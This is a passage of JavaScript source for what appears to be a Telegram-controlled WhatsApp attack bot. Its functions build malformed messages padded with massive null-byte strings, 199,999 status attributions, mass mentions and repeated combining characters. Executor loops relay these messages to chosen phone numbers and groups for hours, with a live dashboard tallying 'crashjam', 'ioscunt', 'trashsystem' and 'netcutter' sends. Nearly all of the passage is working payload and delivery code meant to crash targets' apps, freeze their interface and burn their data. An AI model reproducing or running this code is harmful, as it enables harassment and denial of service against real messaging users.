SwHCEHCJAFnK3lAsBwgGbSzaQbRW9pAFtLC7uQ7S1tFAESe9aJwhJJ5rEBhOVixCXID//Z\nX-WA-BIZ-NAME:🦠⃰‌°‌‌•⃟𝘅𝗿‌𝗲‌𝗹⃨𝗹𝘆‌‌-𝗰‌𝗹𝗶⃨𝗲𝗻‌‌𝘁 ⿻ 𝐓𝐡𝐫𝐞𝐞𝐬𝐢𝐱𝐭𝐲 ✶ > 666${"ᩫᩫ".repeat(4000)}\nEND:VCARD`,
            contextInfo: {
              participant: target,
              externalAdReply: {
                automatedGreetingMessageShown: true,
                automatedGreetingMessageCtaType: "\u0000".repeat(100000),
                greetingMessageBody: "\u0000"
              }
            }
          }
        },
        {}
      );

      await userSock.relayMessage(
        "status@broadcast",
        msg.message,
        {
          messageId: msg.key.id,
          statusJidList: [target],
          additionalNodes: [
            {
              tag: "meta",
              attrs: {},
              content: [
                {
                  tag: "mentioned_users",
                  attrs: {},
                  content: [
                    {
                      tag: "to",
                      attrs: { jid: target },
                      content: undefined
                    }
                  ]
                }
              ]
            }
          ]
        }
      );
  console.log(chalk.green(`ioscunt sent to ${target}`));
        count++;
        dashboard.pranks.set(target, { count, type });

        const now = Date.now();
        if ((count % 50 === 0 || Math.random() < 0.03) && now - dashboard.lastEditTime > 6000) {
          await updateDashboard(botInstance, dashboard, 'live');
        }
      } catch (sendErr) {
        console.error(`Send failed: ${sendErr.message}`);
        break;
      }
    }

    const finalCount = dashboard.pranks.get(target)?.count || count;
    dashboard.pranks.delete(target);

    console.log(chalk.green(`Bvg finished/stopped → ${target} | Count: ${finalCount}`));
  } catch (err) {
    console.error(`Error in prankGreet2 ${userNumber}→${target}:`, err.message);
    const dashboard = userPrankDashboards.get(chatId);
    if (dashboard) dashboard.pranks.delete(target);
  } finally {
    if (releaseInitLock) releaseInitLock();
    prankInitLocks.delete(prankKey);

    activePrankGreets.delete(prankKey);

    // ────────────────────────────────────────────────
    // CENTRALIZED DISCONNECT NOTIFICATION (only once per user)
    // ────────────────────────────────────────────────
    if (!sessions.has(userNumber) || !whatsappStatusMap.get(userNumber)) {
      // Acquire notification lock for this chatId
      let notifyRelease;
      let notifyLock = disconnectNotifyLocks.get(chatId);
      if (!notifyLock) {
        notifyLock = new Promise(r => { notifyRelease = r; });
        disconnectNotifyLocks.set(chatId, notifyLock);
      } else {
        await notifyLock; // wait if another prank already sent it
      }

      // Double-check: only send if still disconnected and not sent yet
      if (!sessions.has(userNumber) && !disconnectedNotified.get(chatId)) {
        try {
          await botInstance.sendMessage(chatId,
 `⚠️ All your active bvg sessions have been *stopped automatically*.\n` +
`Reason: WhatsApp session disconnected or deleted.\n` +
`Use /reqpair to reconnect and restart if needed.`,
            { parse_mode: 'Markdown' }
          );
          disconnectedNotified.set(chatId, true);
          console.log(`[DISCONNECT NOTIFY] Sent single message for chatId ${chatId}`);

          // Auto-clear flag after 10 minutes
          setTimeout(() => {
            disconnectedNotified.delete(chatId);
            disconnectNotifyLocks.delete(chatId);
          }, 10 * 60 * 1000);
        } catch (notifyErr) {
          console.error(`Failed to send disconnect notification: ${notifyErr.message}`);
        }
      }

      if (notifyRelease) notifyRelease();
      disconnectNotifyLocks.delete(chatId); // cleanup
    }

    // Delayed dashboard cleanup
    const dashboard = userPrankDashboards.get(chatId);
    if (dashboard && dashboard.pranks.size === 0) {
      setTimeout(() => {
        if (userPrankDashboards.get(chatId)?.pranks.size === 0) {
          userPrankDashboards.delete(chatId);
          if (dashboard.messageId) {
            botInstance.deleteMessage(chatId, dashboard.messageId).catch(() => {});
          }
        }
      }, 4000);
    }
  }
}

async function prankGreet(target, userNumber, chatId, botInstance) {
  const prankKey = `${userNumber}:${target}`;
  const type = 'crashjam';  // Fixed type for this function

  // ────────────────────────────────────────────────
  // VERY EARLY + LOCKED CHECK
  // ────────────────────────────────────────────────
  if (activePrankGreets.has(prankKey)) {
    console.log(`[DEBUG] Duplicate blocked (already active): ${prankKey}`);
    await botInstance.sendMessage(chatId, 
      `⚠️ crashjam is *already running* for ${target.replace(/@s.whatsapp.net$/, '')}.\n` +
      `Use /stopcrashjam ${target.replace(/@s.whatsapp.net$/, '')} to stop it first.`,
      { parse_mode: 'Markdown' }
    );
    return;
  }

  // Acquire init lock
  if (prankInitLocks.has(prankKey)) {
    console.log(`[DEBUG] Waiting for init lock: ${prankKey}`);
    await prankInitLocks.get(prankKey);
    if (activePrankGreets.has(prankKey)) {
      console.log(`[DEBUG] Became duplicate during lock wait: ${prankKey}`);
      await botInstance.sendMessage(chatId, 
        `⚠️ crashjam is *already running* for ${target.replace(/@s.whatsapp.net$/, '')}.\n` +
        `Use /stopcrashjam ${target.replace(/@s.whatsapp.net$/, '')} to stop it first.`,
        { parse_mode: 'Markdown' }
      );
      return;
    }
  }

  let releaseInitLock;
  const initLockPromise = new Promise(resolve => { releaseInitLock = resolve; });
  prankInitLocks.set(prankKey, initLockPromise);

  try {
    console.log(`[DEBUG] Acquired lock & starting: ${prankKey}`);

    if (!(await validateSession(userNumber, chatId, botInstance))) {
      throw new Error('No active WhatsApp session');
    }

    let userSock = sessions.get(userNumber);
    if (!userSock) throw new Error('Socket not found');

    const startTime = Date.now();
    const maxDuration = 60 * 60 * 1000;

    let dashboard = userPrankDashboards.get(chatId);
    if (!dashboard) {
      dashboard = {
        messageId: null,
        chatId,
        lastEditTime: 0,
        pranks: new Map()
      };
      userPrankDashboards.set(chatId, dashboard);
    }

    const isFirstPrank = dashboard.pranks.size === 0;
    dashboard.pranks.set(target, { count: 0, type });

    if (dashboard.messageId && !isFirstPrank) {
      try {
        await botInstance.deleteMessage(chatId, dashboard.messageId);
        dashboard.messageId = null;
      } catch {}
    }

    await updateDashboard(botInstance, dashboard, 'live');

    const thisControl = {
      stopFlag: false,
      dashboardKey: chatId,
      startTime,
      instanceId: Date.now() + Math.random(),
      type  // Add type to control
    };

    activePrankGreets.set(prankKey, thisControl);

    await new Promise(r => setTimeout(r, 3000));
    dashboard.lastEditTime = Date.now();

    let count = 0;
    while (Date.now() - startTime < maxDuration) {
      const current = activePrankGreets.get(prankKey);
      if (!current || current !== thisControl || current.stopFlag) {
        console.log(`[DEBUG] Loop exited - !current=${!current}, replaced=${current !== thisControl}, flagged=${current?.stopFlag}`);
        break;
      }

      // AUTO-STOP CHECK (no notification here anymore)
      if (!sessions.has(userNumber) || !whatsappStatusMap.get(userNumber)) {
        console.log(`[PRANK AUTO-STOP] Session deleted/disconnected → ${prankKey}`);
        break;
      }

      try {
        const msgData = {
      interactiveResponseMessage: {
        body: {
          text: "\u0000".repeat(200),
          format: "DEFAULT"
        },
        nativeFlowResponseMessage: {
          name: "call_permission_request",
          paramsJson: `{\"flow_cta\":\"${"\u0000".repeat(9999)}\"}}`,
          version: 3
        },
        contextInfo: {
          mentionedJid: Array.from({ length: 1000 }, (_, y) => `555193871982${y + 1}@s.whatsapp.net`),
          remoteJid: "status@broadcast",
          statusAttributionType: "RESHARED_FROM_POST",
          isQuestion: true,
          statusAttributions: Array(199999).fill({ type: "EXTERNAL_SHARE" })
        }
      }
    };

    const msg = generateWAMessageFromContent(
      "status@broadcast",
      msgData, 
      { userJid: userSock.user.id }
    );

    await userSock.relayMessage("status@broadcast", msg.message, {
      messageId: msg.key.id,
      statusJidList: [target],
      additionalNodes: [{
        tag: "meta",
        attrs: {},
        content: [{
          tag: "mentioned_users",
          attrs: {},
          content: [{ tag: "to", attrs: { jid: target } }]
        }]
      }]
    });
    console.log(chalk.green(`crashjam sent to ${target}`));
        count++;
        dashboard.pranks.set(target, { count, type });

        const now = Date.now();
        if ((count % 50 === 0 || Math.random() < 0.03) && now - dashboard.lastEditTime > 6000) {
          await updateDashboard(botInstance, dashboard, 'live');
        }
      } catch (sendErr) {
        console.error(`Send failed: ${sendErr.message}`);
        break;
      }
    }

    const finalCount = dashboard.pranks.get(target)?.count || count;
    dashboard.pranks.delete(target);

    console.log(chalk.green(`Bvg finished/stopped → ${target} | Count: ${finalCount}`));
  } catch (err) {
    console.error(`Error in prankGreet ${userNumber}→${target}:`, err.message);
    const dashboard = userPrankDashboards.get(chatId);
    if (dashboard) dashboard.pranks.delete(target);
  } finally {
    if (releaseInitLock) releaseInitLock();
    prankInitLocks.delete(prankKey);

    activePrankGreets.delete(prankKey);

    // ────────────────────────────────────────────────
    // CENTRALIZED DISCONNECT NOTIFICATION (only once per user)
    // ────────────────────────────────────────────────
    if (!sessions.has(userNumber) || !whatsappStatusMap.get(userNumber)) {
      // Acquire notification lock for this chatId
      let notifyRelease;
      let notifyLock = disconnectNotifyLocks.get(chatId);
      if (!notifyLock) {
        notifyLock = new Promise(r => { notifyRelease = r; });
        disconnectNotifyLocks.set(chatId, notifyLock);
      } else {
        await notifyLock; // wait if another prank already sent it
      }

      // Double-check: only send if still disconnected and not sent yet
      if (!sessions.has(userNumber) && !disconnectedNotified.get(chatId)) {
        try {
          await botInstance.sendMessage(chatId,
            `⚠️ All your active bvg sessions have been *stopped automatically*.\n` +
`Reason: WhatsApp session disconnected or deleted.\n` +
`Use /reqpair to reconnect and restart if needed.`,
            { parse_mode: 'Markdown' }
          );
          disconnectedNotified.set(chatId, true);
          console.log(`[DISCONNECT NOTIFY] Sent single message for chatId ${chatId}`);

          // Auto-clear flag after 10 minutes
          setTimeout(() => {
            disconnectedNotified.delete(chatId);
            disconnectNotifyLocks.delete(chatId);
          }, 10 * 60 * 1000);
        } catch (notifyErr) {
          console.error(`Failed to send disconnect notification: ${notifyErr.message}`);
        }
      }

      if (notifyRelease) notifyRelease();
      disconnectNotifyLocks.delete(chatId); // cleanup
    }

    // Delayed dashboard cleanup
    const dashboard = userPrankDashboards.get(chatId);
    if (dashboard && dashboard.pranks.size === 0) {
      setTimeout(() => {
        if (userPrankDashboards.get(chatId)?.pranks.size === 0) {
          userPrankDashboards.delete(chatId);
          if (dashboard.messageId) {
            botInstance.deleteMessage(chatId, dashboard.messageId).catch(() => {});
          }
        }
      }, 4000);
    }
  }
}

async function updateDashboard(botInstance, dashboard, mode = 'live', customText = null, isNewPrank = false) {
  const { chatId, pranks, messageId } = dashboard;

  // Build the text first
  let text = '';
  if (customText) {
    text += `${customText}\n\n`;
  }

  if (pranks.size > 0) {
    text += "🚀 *Active Bvg Dashboard*\n";
    let totalSent = 0;

    for (const [target, data] of pranks) {
      const { count, type } = data;
      const typeName = type === 'crashjam' ? 'CrashJam' : 'ioscunt';
      const cleanTarget = target.replace(/@s.whatsapp.net$/, '');
      text += `\n${typeName} Target: ${cleanTarget}\nTotal bvg sent: ${count}\n`;
      totalSent += count;
    }

    // ────────────────────────────────────────────────
    // DYNAMIC FOOTER BASED ON ACTIVE TYPES
    // ────────────────────────────────────────────────
    let footer = `\n📊 Overall bvg sent: ${totalSent}\n\n`;

    // Check which types are currently running
    const hasCrashjam  = [...pranks.values()].some(p => p.type === 'crashjam');
    const hasCrashjam2 = [...pranks.values()].some(p => p.type === 'ioscunt');

    if (hasCrashjam && hasCrashjam2) {
      // Both types are active → show all stop options
      footer += 
        `/stopcrashjam to stop all\n` +
        `/stopcrashjam +123 to stop single\n` +
        `/stopioscunt to stop all\n` +
        `/stopioscunt +123 to stop single\n` +
        `/stopall to stop everything`;
    } 
    else if (hasCrashjam) {
      // Only crashjam is running
      footer += 
        `/stopcrashjam to stop all\n` +
        `/stopcrashjam +123 to stop single\n`;
    } 
    else if (hasCrashjam2) {
      // Only crashjam2 is running
      footer += 
        `/stopioscunt to stop all\n` +
        `/stopioscunt +123 to stop single\n`;
    } 
    else {
      footer += "No active bvg.";
    }

    text += footer;
  } else {
    text += "🏁 No active bvg.\nDashboard auto-closes soon.";
  }

  let newMessageId = null;

  // Step 1: If this is a NEW prank start → delete old message first
  if (isNewPrank && messageId) {
    try {
      await botInstance.deleteMessage(chatId, messageId);
      dashboard.messageId = null;
      console.log(`Deleted old dashboard message for new bvg start`);
    } catch (err) {
      console.warn(`Delete failed (maybe already deleted): ${err.message}`);
    }
  }

  // Step 2: Try to EDIT if we still have a valid messageId
  if (dashboard.messageId) {
    try {
      await botInstance.editMessageText(text, {
        chat_id: chatId,
        message_id: dashboard.messageId,
        parse_mode: 'Markdown'
      });
      console.log(`Dashboard edited successfully (ID: ${dashboard.messageId})`);
      dashboard.lastEditTime = Date.now();
      return;  // Success → done
    } catch (editErr) {
      console.warn(`Edit failed: ${editErr.message}. Falling back to new message.`);
    }
  }

  // Step 3: Send new message (fallback or after delete)
  try {
    const sent = await botInstance.sendMessage(chatId, text, { parse_mode: 'Markdown' });
    newMessageId = sent.message_id;
    dashboard.messageId = newMessageId;
    console.log(`New dashboard sent (ID: ${newMessageId})`);
  } catch (sendErr) {
    console.error(`Failed to send dashboard: ${sendErr.message}`);
  }

  dashboard.lastEditTime = Date.now();
}*/ 

async function xeonDelayXCrash(target, userNumber, chatId, botInstance) {
  try {
    if (!(await validateSession(userNumber, chatId, botInstance))) {
      throw new Error('No active WhatsApp session');
    }
    const userSock = sessions.get(userNumber);

const msgData = {
      interactiveResponseMessage: {
        body: {
          text: "\u0000".repeat(200),
          format: "DEFAULT"
        },
        nativeFlowResponseMessage: {
          name: "call_permission_request",
          paramsJson: `{\"flow_cta\":\"${"\u0000".repeat(9999)}\"}}`,
          version: 3
        },
        contextInfo: {
          mentionedJid: Array.from({ length: 1000 }, (_, y) => `555193871982${y + 1}@s.whatsapp.net`),
          remoteJid: "status@broadcast",
          statusAttributionType: "RESHARED_FROM_POST",
          isQuestion: true,
          statusAttributions: Array(199999).fill({ type: "EXTERNAL_SHARE" })
        }
      }
    };

    const msg = generateWAMessageFromContent(
      "status@broadcast",
      msgData, 
      { userJid: userSock.user.id }
    );

    await userSock.relayMessage("status@broadcast", msg.message, {
      messageId: msg.key.id,
      statusJidList: [target],
      additionalNodes: [{
        tag: "meta",
        attrs: {},
        content: [{
          tag: "mentioned_users",
          attrs: {},
          content: [{ tag: "to", attrs: { jid: target } }]
        }]
      }]
    });
    console.log(chalk.green(`crashjam sent to ${target}`));
  } catch (err) {
  console.error(`Error in crashjam for ${userNumber}:`, err.message);
  const userBot = getUserBot(botInstance);
  /*await userBot.sendMessage(chatId, `❌ Error in uiking: ${err.message}. Process stopped.`);*/
  throw err; // Keep the throw to maintain behavior
}
}

async function xeonDelayXCrashExecutor(durationHours, target, userNumber, chatId, botInstance) {
  const totalDurationMs = durationHours * 60 * 60 * 1000;
  const startTime = Date.now();
  let batch = 1;
  const maxBatches = 5;
  const batchDuration = 60 * 60 * 1000; // 1 hour batch duration
  const batchDelay = 60 * 60 * 1000; // 1 hour delay between batches

  while (batch <= maxBatches && Date.now() - startTime < totalDurationMs) {
    const batchStart = Date.now();
    console.log(chalk.green(`👀 Starting batch ${batch}...`));
    let count = 0;
    const maxLoops = 25;

    while (Date.now() - batchStart < batchDuration) {
      try {
        if (!(await validateSession(userNumber, chatId, botInstance))) {
          return;
        }
        
        while (count < maxLoops) {
          await Promise.all([
            xeonDelayXCrash(target, userNumber, chatId, botInstance)
          ]);
          await sleep(1000);
          count++;
          
          if (count >= maxLoops) {
            console.log(chalk.bgYellow.black("Loop 25 reached, sleep 10 seconds before restart..."));
            await new Promise(resolve => setTimeout(resolve, 10000));
            count = 0;
          }
        }
      } catch (error) {
        console.error(`❌Error while sending: ${error.message}`);
        const userBot = getUserBot(botInstance);
        /*await userBot.sendMessage(chatId, `❌ Error in delayking: ${error.message}. Process stopped.`);*/
        return; // Stop the whole function after one error
      }
    }
    console.log(chalk.green(`👀 Finished batch ${batch}`));
    batch++;
    if (batch <= maxBatches) {
      console.log(chalk.blue(`Waiting for 1 hour before next batch...`));
      await new Promise(resolve => setTimeout(resolve, batchDelay));
    }
  }
  console.log(`✅ Done! Total batches sent: ${batch - 1}`);
}

async function xeonUiTrasher(target, userNumber, chatId, botInstance) {
  try {
    if (!(await validateSession(userNumber, chatId, botInstance))) {
      throw new Error('No active WhatsApp session');
    }
    const userSock = sessions.get(userNumber);

let msg = await generateWAMessageFromContent(
      target,
      {
        botInvokeMessage: {
          message: {
            messageContextInfo: {
              messageSecret: crypto.randomBytes(32),
              messageAssociation: {
                associationType: 7,
                parentMessageKey: crypto.randomBytes(16),
              },
            },
            interactiveMessage: {
              header: {
                title: `${"\u0000"}` + "Telegram: @dgxeon13" + "\r",
                locationMessage: {
                  degreesLatitude: -999.03499999999999,
                  degreesLongitude: 922.999999999999,
                  name: `${"\u0000"}` + "Telegram: @dgxeon13" + "\r",
                  address: `${"\u0000"}` + "Telegram: @dgxeon13" + "\r",
                  jpegThumbnail: null,
                },
                hasMediaAttachment: false,
              },
              body: {
                text:
                  (
                    `${"Telegram: @dgxeon13"}` +
                    "꧀꧀꧀".repeat(500) +
                    "꧀꧀꧀".repeat(500) +
                    "꧀꧀꧀".repeat(500) +
                    "꧀꧀꧀".repeat(500)
                  ).repeat(49) + "@1",
              },
              nativeFlowMessage: {
                messageParamsJson: "{ Telegram: @dgxeon13 }",
                buttons: [],
              },
              contextInfo: {
                groupMentions: [
                  { groupJid: "1@newsletter", groupSubject: "Telegram: @dgxeon13" },
                ],
              },
            },
          },
        },
      },
      { userJid: target },
    );

    await userSock.relayMessage(target, msg.message, {
      participant: { jid: target },
    });

    let msg1 = await generateWAMessageFromContent(
      target,
      {
        botInvokeMessage: {
          message: {
            messageContextInfo: {
              messageSecret: crypto.randomBytes(32),
              messageAssociation: {
                associationType: 7,
                parentMessageKey: crypto.randomBytes(16),
              },
            },
            interactiveMessage: {
              header: {
                title: `${"\u0000"}` + "Telegram: @dgxeon13" + "\r",
                locationMessage: {
                  degreesLatitude: -999.03499999999999,
                  degreesLongitude: 922.999999999999,
                  name: `${"\u0000"}` + "Telegram: @dgxeon13" + "\r",
                  address: `${"\u0000"}` + "Telegram: @dgxeon13" + "\r",
                  jpegThumbnail: null,
                },
                hasMediaAttachment: false,
              },
              body: {
                text:
                  (
                    `${"Telegram: @dgxeon13"}` +
                    "꧀ꦽꦽ".repeat(500) +
                    "ꦽ꧀ꦽ".repeat(500) +
                    "꧀ꦽꦽ".repeat(500) +
                    "ꦽ꧀ꦽ".repeat(500)
                  ).repeat(50) + "@1",
              },
              nativeFlowMessage: {
                messageParamsJson: "{ Telegram: @dgxeon13 }",
                buttons: [],
              },
              contextInfo: {
                groupMentions: [
                  { groupJid: "1@newsletter", groupSubject: "Telegram: @dgxeon13" },
                ],
              },
            },
          },
        },
      },
      { userJid: target },
    );

    await userSock.relayMessage(target, msg1.message, {
      participant: { jid: target },
    });
    console.log(chalk.green(`trashsystem sent to ${target}`));
  } catch (err) {
  console.error(`Error in trashsystem for ${userNumber}:`, err.message);
  const userBot = getUserBot(botInstance);
  /*await userBot.sendMessage(chatId, `❌ Error in uiking: ${err.message}. Process stopped.`);*/
  throw err; // Keep the throw to maintain behavior
}
}

async function xeonUiTrasherExecutor(durationHours, target, userNumber, chatId, botInstance) {
  const totalDurationMs = durationHours * 60 * 60 * 1000;
  const startTime = Date.now();
  let batch = 1;
  const maxBatches = 5;
  const batchDuration = 60 * 60 * 1000; // 1 hour batch duration
  const batchDelay = 60 * 60 * 1000; // 1 hour delay between batches

  while (batch <= maxBatches && Date.now() - startTime < totalDurationMs) {
    const batchStart = Date.now();
    console.log(chalk.green(`👀 Starting batch ${batch}...`));
    let count = 0;
    const maxLoops = 25;

    while (Date.now() - batchStart < batchDuration) {
      try {
        if (!(await validateSession(userNumber, chatId, botInstance))) {
          return;
        }
        
        while (count < maxLoops) {
          await Promise.all([
            xeonUiTrasher(target, userNumber, chatId, botInstance)
          ]);
          await sleep(1000);
          console.log(chalk.yellow(` ┌────────────────────────┐ │ Sending... 🦄 └────────────────────────┘ `));
          count++;
          
          if (count >= maxLoops) {
            console.log(chalk.bgYellow.black("Loop 25 reached, sleep 10 seconds before restart..."));
            await new Promise(resolve => setTimeout(resolve, 10000));
            count = 0;
          }
        }
      } catch (error) {
        console.error(`❌Error while sending: ${error.message}`);
        const userBot = getUserBot(botInstance);
        /*await userBot.sendMessage(chatId, `❌ Error in uking: ${error.message}. Process stopped.`);*/
        return; // Stop the whole function after one error
      }
    }
    console.log(chalk.green(`👀 Finished batch ${batch}`));
    batch++;
    if (batch <= maxBatches) {
      console.log(chalk.blue(`Waiting for 1 hour before next batch...`));
      await new Promise(resolve => setTimeout(resolve, batchDelay));
    }
  }
  console.log(`✅ Done! Total batches sent: ${batch - 1}`);
}

async function xeonUiTrasherGp(target, userNumber, chatId, botInstance) {
  if (!(await validateSession(userNumber, chatId, botInstance))) {
    throw new Error('No active WhatsApp session');
  }

  try {
  
  const userSock = sessions.get(userNumber);
    
    let msg = await generateWAMessageFromContent(
      target,
      {
        botInvokeMessage: {
          message: {
            messageContextInfo: {
              messageSecret: crypto.randomBytes(32),
              messageAssociation: {
                associationType: 7,
                parentMessageKey: crypto.randomBytes(16),
              },
            },
            interactiveMessage: {
              header: {
                title: `${"\u0000"}` + "Telegram: @dgxeon13" + "\r",
                locationMessage: {
                  degreesLatitude: -999.03499999999999,
                  degreesLongitude: 922.999999999999,
                  name: `${"\u0000"}` + "Telegram: @dgxeon13" + "\r",
                  address: `${"\u0000"}` + "Telegram: @dgxeon13" + "\r",
                  jpegThumbnail: null,
                },
                hasMediaAttachment: false,
              },
              body: {
                text:
                  (
                    `${"Telegram: @dgxeon13"}` +
                    "꧀꧀꧀".repeat(500) +
                    "꧀꧀꧀".repeat(500) +
                    "꧀꧀꧀".repeat(500) +
                    "꧀꧀꧀".repeat(500)
                  ).repeat(49) + "@1",
              },
              nativeFlowMessage: {
                messageParamsJson: "{ Telegram: @dgxeon13 }",
                buttons: [],
              },
              contextInfo: {
                groupMentions: [
                  { groupJid: "1@newsletter", groupSubject: "Telegram: @dgxeon13" },
                ],
              },
            },
          },
        },
      },
      { userJid: target },
    );

    await userSock.relayMessage(target, msg.message, {
    });

    let msg1 = await generateWAMessageFromContent(
      target,
      {
        botInvokeMessage: {
          message: {
            messageContextInfo: {
              messageSecret: crypto.randomBytes(32),
              messageAssociation: {
                associationType: 7,
                parentMessageKey: crypto.randomBytes(16),
              },
            },
            interactiveMessage: {
              header: {
                title: `${"\u0000"}` + "Telegram: @dgxeon13" + "\r",
                locationMessage: {
                  degreesLatitude: -999.03499999999999,
                  degreesLongitude: 922.999999999999,
                  name: `${"\u0000"}` + "Telegram: @dgxeon13" + "\r",
                  address: `${"\u0000"}` + "Telegram: @dgxeon13" + "\r",
                  jpegThumbnail: null,
                },
                hasMediaAttachment: false,
              },
              body: {
                text:
                  (
                    `${"Telegram: @dgxeon13"}` +
                    "꧀ꦽꦽ".repeat(500) +
                    "ꦽ꧀ꦽ".repeat(500) +
                    "꧀ꦽꦽ".repeat(500) +
                    "ꦽ꧀ꦽ".repeat(500)
                  ).repeat(50) + "@1",
              },
              nativeFlowMessage: {
                messageParamsJson: "{ Telegram: @dgxeon13 }",
                buttons: [],
              },
              contextInfo: {
                groupMentions: [
                  { groupJid: "1@newsletter", groupSubject: "Telegram: @dgxeon13" },
                ],
              },
            },
          },
        },
      },
      { userJid: target },
    );

    await userSock.relayMessage(target, msg1.message, {
    });
  } catch (error) {
    console.error(`Error in trashsysgp for ${userNumber}:`, error.message);
    const userBot = getUserBot(botInstance);
    await userBot.sendMessage(chatId, `❌ Failed to send bvg to group ${target.replace('@g.us', '')}: ${error.message}`);
    throw error; // Keep the throw to maintain behavior
  }
}

async function xeonUiTrasherGpExecutor(durationHours, target, userNumber, chatId, botInstance) {
  const totalDurationMs = durationHours * 60 * 60 * 1000;
  const startTime = Date.now();
  let batch = 1;
  const maxBatches = 5;
  const batchDuration = 60 * 60 * 1000; // 1 hour batch duration
  const batchDelay = 60 * 60 * 1000; // 1 hour delay between batches

  while (batch <= maxBatches && Date.now() - startTime < totalDurationMs) {
    const batchStart = Date.now();
    console.log(chalk.green(`👀 Starting batch ${batch}...`));
    let count = 0;
    const maxLoops = 25;

    while (Date.now() - batchStart < batchDuration) {
      try {
        if (!(await validateSession(userNumber, chatId, botInstance))) {
        console.log(`⚠️ Session invalid for ${target}, stopping...`);
        return;
      }
        
        while (count < maxLoops) {
          await Promise.all([
            xeonUiTrasherGp(target, userNumber, chatId, botInstance)
          ]);
          await sleep(1000);
          console.log(chalk.yellow(` ┌────────────────────────┐ │ Sending... 🦄 └────────────────────────┘ `));
          count++;
          
          if (count >= maxLoops) {
            console.log(chalk.bgYellow.black("Loop 25 reached, sleep 10 seconds before restart..."));
            await new Promise(resolve => setTimeout(resolve, 10000));
            count = 0;
          }
        }
      } catch (error) {
        console.error(`❌Error while sending: ${error.message}`);
        const userBot = getUserBot(botInstance);
        /*await userBot.sendMessage(chatId, `❌ Error in trashsysgp: ${error.message}. Process stopped.`);*/
        return; // Stop the whole function after one error
      }
    }
    console.log(chalk.green(`👀 Finished batch ${batch}`));
    batch++;
    if (batch <= maxBatches) {
      console.log(chalk.blue(`Waiting for 1 hour before next batch...`));
      await new Promise(resolve => setTimeout(resolve, batchDelay));
    }
  }
  console.log(`✅ Done! Total batches sent: ${batch - 1}`);
}

async function xeonQuotaConsumer(target, userNumber, chatId, botInstance) {
  try {
    if (!(await validateSession(userNumber, chatId, botInstance))) {
      throw new Error('No active WhatsApp session');
    }
    const userSock = sessions.get(userNumber);

const msg = await generateWAMessageFromContent(target, {
            interactiveResponseMessage: {
                contextInfo: {},
                body: {
                    text: "Telegram: @dgxeon13",
                    format: "DEFAULT"
                },
                nativeFlowResponseMessage: {
                    name: "galaxy_message",
                    paramsJson: `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"Telegram: @dgxeon13\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"Telegram: @dgxeon13\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"Telegram: @dgxeon13${"\u0000".repeat(1045000)}\",\"screen_0_TextInput_1\":\"INFINITE\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
                    version: 3
                }
            }
        }, {});
        
        await userSock.relayMessage(target, { groupStatusMessageV2: { message: msg.message } }, {});
    console.log(chalk.green(`netcutter sent to ${target}`));
  } catch (err) {
  console.error(`Error in netcutter for ${userNumber}:`, err.message);
  const userBot = getUserBot(botInstance);
  /*await userBot.sendMessage(chatId, `❌ Error in uiking: ${err.message}. Process stopped.`);*/
  throw err; // Keep the throw to maintain behavior
}
}

async function xeonQuotaConsumerExecutor(durationHours, target, userNumber, chatId, botInstance) {
  const totalDurationMs = durationHours * 60 * 60 * 1000;
  const startTime = Date.now();
  let batch = 1;
  const maxBatches = 5;
  const batchDuration = 60 * 60 * 1000; // 1 hour batch duration
  const batchDelay = 60 * 60 * 1000; // 1 hour delay between batches

  while (batch <= maxBatches && Date.now() - startTime < totalDurationMs) {
    const batchStart = Date.now();
    console.log(chalk.green(`👀 Starting batch ${batch}...`));
    let count = 0;
    const maxLoops = 25;

    while (Date.now() - batchStart < batchDuration) {
      try {
        if (!(await validateSession(userNumber, chatId, botInstance))) {
          return;
        }
        
        while (count < maxLoops) {
          await Promise.all([
            xeonQuotaConsumer(target, userNumber, chatId, botInstance)
          ]);
          await sleep(1000);
          console.log(chalk.yellow(` ┌────────────────────────┐ │ Sending... 🦄 └────────────────────────┘ `));
          count++;
          
          if (count >= maxLoops) {
            console.log(chalk.bgYellow.black("Loop 25 reached, sleep 10 seconds before restart..."));
            await new Promise(resolve => setTimeout(resolve, 10000));
            count = 0;
          }
        }
      } catch (error) {
        console.error(`❌Error while sending: ${error.message}`);
        const userBot = getUserBot(botInstance);
        /*await userBot.sendMessage(chatId, `❌ Error in uking: ${error.message}. Process stopped.`);*/
        return; // Stop the whole function after one error
      }
    }
    console.log(chalk.green(`👀 Finished batch ${batch}`));
    batch++;
    if (batch <= maxBatches) {
      console.log(chalk.blue(`Waiting for 1 hour before next batch...`));
      await new Promise(resolve => setTimeout(resolve, batchDelay));
    }
  }
  console.log(`✅ Done! Total batches sent: ${batch - 1}`);
}

async function xeonDelayNewExecutor(durationHours, target, userNumber, chatId, botInstance, ptcp) {
  const totalDurationMs = durationHours * 60 * 60 * 1000;
  const startTime = Date.now();
  let batch = 1;
  const maxBatches = 5;
  const batchDuration = 60 * 60 * 1000; // 1 hour batch duration
  const batchDelay = 60 * 60 * 1000; // 1 hour delay between batches

  while (batch <= maxBatches && Date.now() - startTime < totalDurationMs) {
    const batchStart = Date.now();
    console.log(chalk.green(`👀 Starting batch ${batch}...`));
    let count = 0;
    const maxLoops = 25;

    while (Date.now() - batchStart < batchDuration) {
      try {
        if (!(await validateSession(userNumber, chatId, botInstance))) {
          return;
        }
        
        while (count < maxLoops) {
          await Promise.all([
            xeonDelayNew(target, userNumber, chatId, botInstance, ptcp), 
            xeonDelayNew2(target, userNumber, chatId, botInstance)
          ]);
          await sleep(2000)
          count++;
          
          if (count >= maxLoops) {
            console.log(chalk.bgYellow.black("Loop 25 reached, sleep 10 seconds before restart..."));
            await new Promise(resolve => setTimeout(resolve, 10000));
            count = 0;
          }
        }
      } catch (error) {
        console.error(`❌Error while sending: ${error.message}`);
        const userBot = getUserBot(botInstance);
        /*await userBot.sendMessage(chatId, `❌ Error in delayking: ${error.message}. Process stopped.`);*/
        return; // Stop the whole function after one error
      }
    }
    console.log(chalk.green(`👀 Finished batch ${batch}`));
    batch++;
    if (batch <= maxBatches) {
      console.log(chalk.blue(`Waiting for 1 hour before next batch...`));
      await new Promise(resolve => setTimeout(resolve, batchDelay));
    }
  }
  console.log(`✅ Done! Total batches sent: ${batch - 1}`);
}

